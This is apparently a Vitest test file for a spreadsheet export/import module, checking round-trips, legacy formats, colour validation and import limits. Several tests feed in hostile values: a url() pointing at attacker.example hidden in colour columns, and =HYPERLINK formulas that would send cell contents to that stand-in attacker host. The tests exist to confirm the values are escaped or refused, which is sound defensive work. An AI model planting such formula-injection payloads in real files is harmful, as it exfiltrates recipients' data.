// ── Spreadsheet round-trip ────────────────────────────────────────────────────
//
// Membership left the score matrix and became a Collections column on
// ##ELEMENTS. These check that the pair of changes is symmetric — every real
// session in Data/ survives export → import with the same elements in the same
// collections — and that a legacy ##TYPES + ##TYPE_SCORES file still converts at
// the same cutoff the .mtda reader uses.

import { describe, it, expect } from 'vitest'
import { readdirSync, readFileSync, existsSync } from 'node:fs'
import { resolve } from 'node:path'
import { deserializeSession } from './parser'
import { exportSpreadsheet } from './exporter'
import { parseSpreadsheet } from './importer'

const DATA_DIR = resolve(process.cwd(), '../Data')
const files = existsSync(DATA_DIR)
  ? readdirSync(DATA_DIR).filter(f => f.endsWith('.mtda'))
  : []

describe('TSV round-trip', () => {
  if (files.length === 0) {
    it.skip('no .mtda files in Data/ to round-trip', () => {})
    return
  }

  for (const f of files) {
    it(f, () => {
      const state = deserializeSession(readFileSync(resolve(DATA_DIR, f), 'utf8'))
      const tsv = exportSpreadsheet(state as never)
      const back = parseSpreadsheet(tsv)

      expect(back.collections.map(c => c.name)).toEqual(state.collections!.map(c => c.name))

      const byName = new Map(back.elements.map(e => [e.name, e]))
      const backNames = (e: { collectionIds: string[] }) =>
        e.collectionIds.map(id => back.collections.find(c => c.id === id)!.name).sort()
      const origNames = (e: { collectionIds: string[] }) =>
        e.collectionIds.map(id => state.collections!.find(c => c.id === id)!.name).sort()

      for (const el of state.elements!) {
        const re = byName.get(el.name)!
        expect(re, el.name).toBeTruthy()
        expect(backNames(re), el.name).toEqual(origNames(el))
      }
      expect(back.warnings).toEqual([])
    })
  }
})

describe('legacy TSV', () => {
  it('preserves open-ended Element and Dimension weights', () => {
    const tsv = [
      '##ELEMENTS', 'Name\tDefinition\tColor\tWeight\tShape\tCollections',
      'Light\t""\t#111111\t0\tcircle\t',
      'Heavy\t""\t#222222\t275\tcircle\t', '',
      '##DIMENSIONS', 'Label\tPole A\tPole B\tDefinition\tWeight',
      'Minor–Major\tMinor\tMajor\t\t0',
      'Near–Far\tNear\tFar\t\t480'
    ].join('\n')

    const parsed = parseSpreadsheet(tsv)
    expect(parsed.elements.map(element => element.weight)).toEqual([0, 275])
    expect(parsed.dimensions.map(dimension => dimension.weight)).toEqual([0, 480])
  })

  it('reads ##TYPES + ##TYPE_SCORES at the 0.5 cutoff', () => {
    const legacy = [
      '##ELEMENTS', 'Name\tDefinition\tColor\tWeight\tShape',
      'Alpha\t""\t#111111\t5\tcircle', 'Beta\t""\t#222222\t5\tsquare', '',
      '##TYPES', 'Name\tDefinition\tColor',
      'Reds\t\t#ff0000', 'Blues\t\t#0000ff', '',
      '##TYPE_SCORES', '\tReds\tBlues',
      'Alpha\t1.000\t0.400',
      'Beta\t0.500\t0.000'
    ].join('\n')
    const r = parseSpreadsheet(legacy)
    const name = (id: string) => r.collections.find(c => c.id === id)!.name
    const alpha = r.elements.find(e => e.name === 'Alpha')!
    const beta  = r.elements.find(e => e.name === 'Beta')!
    expect(alpha.collectionIds.map(name)).toEqual(['Reds'])   // 0.4 Blues dropped
    expect(beta.collectionIds.map(name)).toEqual(['Reds'])    // 0.5 kept
  })

  it('lets a Collections cell name a collection with no ##COLLECTIONS row', () => {
    const tsv = [
      '##ELEMENTS', 'Name\tDefinition\tColor\tWeight\tShape\tCollections',
      'Alpha\t""\t#111111\t5\tcircle\tGhosts|Reds'
    ].join('\n')
    const r = parseSpreadsheet(tsv)
    expect(r.collections.map(c => c.name)).toEqual(['Ghosts', 'Reds'])
    expect(r.elements[0].collectionIds).toHaveLength(2)
  })
})

// ── Colors from an untrusted spreadsheet ──────────────────────────────────────
//
// The element column was already checked against '#rrggbb'; the collection
// column was not, and a spreadsheet is the easier of the two files to hand
// someone. Both now go through the same reader — see lib/color.ts for why a
// color is a place a remote request can hide.

describe('Colors are constrained to hex on import', () => {
  const tsv = (elementColor: string, collectionColor: string): string => [
    '##COLLECTIONS',
    'Name\tDefinition\tColor',
    `Group\t\t${collectionColor}`,
    '',
    '##ELEMENTS',
    'Name\tDefinition\tColor\tWeight\tShape\tCollections',
    `One\t\t${elementColor}\t1\tcircle\tGroup`
  ].join('\n')

  it('refuses a url() smuggled into either color column', () => {
    const result = parseSpreadsheet(tsv(
      'url(https://attacker.example/b.png)',
      'url(https://attacker.example/b.png)'
    ))
    expect(result.elements[0].color).toBe('#9d9d53')
    expect(result.collections[0].color).toBe('#808080')
  })

  it('refuses named and short-form CSS colors in the collection column', () => {
    for (const color of ['red', '#abc', 'rgb(1,2,3)']) {
      const result = parseSpreadsheet(tsv('#123456', color))
      expect(result.collections[0].color).toBe('#808080')
      // The valid element color alongside it is still kept.
      expect(result.elements[0].color).toBe('#123456')
    }
  })

  it('keeps real hex colors in both columns', () => {
    const result = parseSpreadsheet(tsv('#AbCdEf', '#4080c0'))
    expect(result.elements[0].color).toBe('#AbCdEf')
    expect(result.collections[0].color).toBe('#4080c0')
  })
})

// ── Spreadsheet formula injection ─────────────────────────────────────────────
//
// This file exists to be opened in Excel, Numbers or LibreOffice, all of which
// evaluate a cell beginning '=', '+', '-' or '@' as a formula. A shared dataset
// whose element is named `=HYPERLINK(...)` therefore becomes live code in the
// recipient's spreadsheet after one hop: they import the dataset, export a TSV,
// and double-click it.

describe('Formula injection on export', () => {
  const stateWith = (name: string, definition = ''): never => ({
    sessionMeta: { id: 's', name: 'S', definition: '' },
    elements: [{ id: 'e1', name, definition, color: '#123456', weight: 1,
                 shape: 'circle', collectionIds: [] }],
    collections: [],
    dimensions: [],
    scores: {}
  }) as never

  const elementRow = (tsv: string): string =>
    tsv.split('\n')[tsv.split('\n').findIndex(l => l.startsWith('##ELEMENTS')) + 2]

  for (const lead of ['=', '+', '-', '@']) {
    it(`neutralizes a name beginning "${lead}"`, () => {
      const name = `${lead}HYPERLINK("https://attacker.example/"&A1,"Results")`
      const row = elementRow(exportSpreadsheet(stateWith(name)))
      expect(row.startsWith(`'${lead}`)).toBe(true)
      expect(row.startsWith(lead)).toBe(false)
    })
  }

  it('neutralizes a formula hidden in a quoted definition', () => {
    const tsv = exportSpreadsheet(stateWith('Fine', '=1+1'))
    expect(tsv).toContain(`"'=1+1"`)
    expect(tsv).not.toContain(`"=1+1"`)
  })

  it('leaves ordinary text alone', () => {
    const row = elementRow(exportSpreadsheet(stateWith('Reading room')))
    expect(row.startsWith('Reading room')).toBe(true)
  })

  it('does not escape numeric columns, which must stay numbers', () => {
    const tsv = exportSpreadsheet(stateWith('Fine'))
    // weight 1 is written directly, never through the text path
    expect(tsv).not.toContain("'1")
  })
})

describe('Formula escaping round-trips', () => {
  const roundTrip = (name: string): string => {
    const state = {
      sessionMeta: { id: 's', name: 'S', definition: '' },
      elements: [{ id: 'e1', name, definition: '', color: '#123456', weight: 1,
                   shape: 'circle', collectionIds: ['c1'] }],
      collections: [{ id: 'c1', name, definition: '', color: '#808080' }],
      dimensions: [],
      scores: {}
    } as never
    return parseSpreadsheet(exportSpreadsheet(state)).elements[0].name
  }

  for (const name of [
    '=Total',
    '-Minus',
    '+Plus',
    '@At',
    "'Tis the season",   // a legitimate leading apostrophe
    "''double",
    'Ordinary name'
  ]) {
    it(`survives export → import: ${JSON.stringify(name)}`, () => {
      expect(roundTrip(name)).toBe(name)
    })
  }

  it('restores an escaped collection name in the membership column', () => {
    const state = {
      sessionMeta: { id: 's', name: 'S', definition: '' },
      elements: [{ id: 'e1', name: 'Item', definition: '', color: '#123456',
                   weight: 1, shape: 'circle', collectionIds: ['c1', 'c2'] }],
      collections: [
        { id: 'c1', name: '=Formula', definition: '', color: '#808080' },
        { id: 'c2', name: 'Normal',   definition: '', color: '#808080' }
      ],
      dimensions: [],
      scores: {}
    } as never
    const back = parseSpreadsheet(exportSpreadsheet(state))
    expect(back.collections.map(c => c.name).sort()).toEqual(['=Formula', 'Normal'])
    expect(back.elements[0].collectionIds).toHaveLength(2)
  })

  it('leaves a hand-authored apostrophe name alone on import', () => {
    // Never exported by Chora, so nothing to unescape: "T" is not a formula lead.
    const tsv = [
      '##ELEMENTS',
      'Name\tDefinition\tColor\tWeight\tShape\tCollections',
      "'Tis the season\t\t#123456\t1\tcircle\t"
    ].join('\n')
    expect(parseSpreadsheet(tsv).elements[0].name).toBe("'Tis the season")
  })
})

// ── Import limits ─────────────────────────────────────────────────────────────

describe('Large and malformed imports fail cleanly', () => {
  it('normalizes a very wide score matrix without overflowing the stack', () => {
    // Math.max(...values) passed every score as its own argument and blew the
    // call stack here. 150k values is comfortably past where that happened.
    const dims = 150
    const rows = 1000
    const header = ['', ...Array.from({ length: dims }, (_, i) => `D${i}`)].join('\t')
    const body = Array.from({ length: rows }, (_, r) =>
      [`E${r}`, ...Array.from({ length: dims }, (_, c) => String((r + c) % 7))].join('\t'))
    const result = parseSpreadsheet([header, ...body].join('\n'))

    expect(result.elements).toHaveLength(rows)
    expect(result.dimensions).toHaveLength(dims)
    // 0–6 in the source, normalized onto 0–1.
    expect(result.scaleNote).toBe('0–6 (normalized to 0–1)')
    const values = Object.values(result.scores).flatMap(r => Object.values(r)) as number[]
    expect(Math.min(...values.slice(0, 1000))).toBeGreaterThanOrEqual(0)
    expect(values.every(v => v >= 0 && v <= 1)).toBe(true)
  })

  it('refuses a file beyond the character limit', () => {
    expect(() => parseSpreadsheet('x'.repeat(8_000_001)))
      .toThrow(/too large to import/)
  })

  it('refuses a file with an implausible number of rows', () => {
    expect(() => parseSpreadsheet('a\tb\n'.repeat(100_001)))
      .toThrow(/too many rows/)
  })
})

// The failure that made bad scores confusing to diagnose: a non-numeric value
// sailed through import and drew as NaN, then threw here, at `.toFixed()` —
// so a malformed import surfaced as a broken export, one action later.
describe('A malformed score map still exports', () => {
  it('does not throw when a stored score is not a number', () => {
    const state = deserializeSession(JSON.stringify({
      version: '5.0',
      elements: [{ id: 'e1', name: 'One', color: '#123456' }],
      collections: [],
      dimensions: [{ id: 'd1', label: 'A–B' }],
      scores: { e1: { d1: 'oops' } },
      maps: []
    }))
    expect(() => exportSpreadsheet(state as never)).not.toThrow()
    // The unreadable score is simply absent rather than exported as garbage.
    const tsv = exportSpreadsheet(state as never)
    expect(tsv).not.toContain('oops')
  })
})

describe('Score-matrix headers are read like any other text', () => {
  it('restores an escaped dimension name when the file has no ##DIMENSIONS', () => {
    // Without that section the header names the dimension rather than merely
    // labelling a column matched by position, so it has to be unescaped too.
    const tsv = [
      '##DIMENSION_SCORES',
      "\t'=Rate\tPlain",
      'Item\t0.5\t0.25'
    ].join('\n')
    const result = parseSpreadsheet(tsv)
    expect(result.dimensions.map(d => d.label).sort()).toEqual(['=Rate', 'Plain'])
  })
})
